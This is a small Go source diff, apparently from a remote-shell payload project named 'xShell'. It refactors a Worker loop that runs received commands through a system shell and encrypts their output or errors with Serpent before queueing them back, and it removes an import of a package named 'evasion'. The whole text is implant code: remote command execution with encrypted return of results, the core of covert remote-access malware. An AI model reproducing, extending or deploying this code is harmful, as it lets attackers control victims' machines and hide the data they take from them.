@@ -4,7 +4,6 @@ import (
 	"os/exec"
 	"strings"
 	"time"
-	"xShell/payload/evasion"
 )
 
 type Worker struct {
@@ -30,7 +29,7 @@ func (w *Worker) Run() {
 			args := cmd[1:]
 			ret, err := exec.Command(shell, args...).Output()
 			if err != nil {
-				encBytes, err := evasion.SerpentEncrypt([]byte(err.Error()), w.Link.Key)
+				encBytes, err := SerpentEncrypt([]byte(err.Error()), w.Link.Key)
 				if err != nil {
 					continue
 				}
@@ -41,7 +40,7 @@ func (w *Worker) Run() {
 				w.Rqueue.Add(newReq)
 				continue
 			}
-			encBytes, err := evasion.SerpentEncrypt([]byte(ret), w.Link.Key)
+			encBytes, err := SerpentEncrypt([]byte(ret), w.Link.Key)
 			if err != nil {
 				continue
 			}
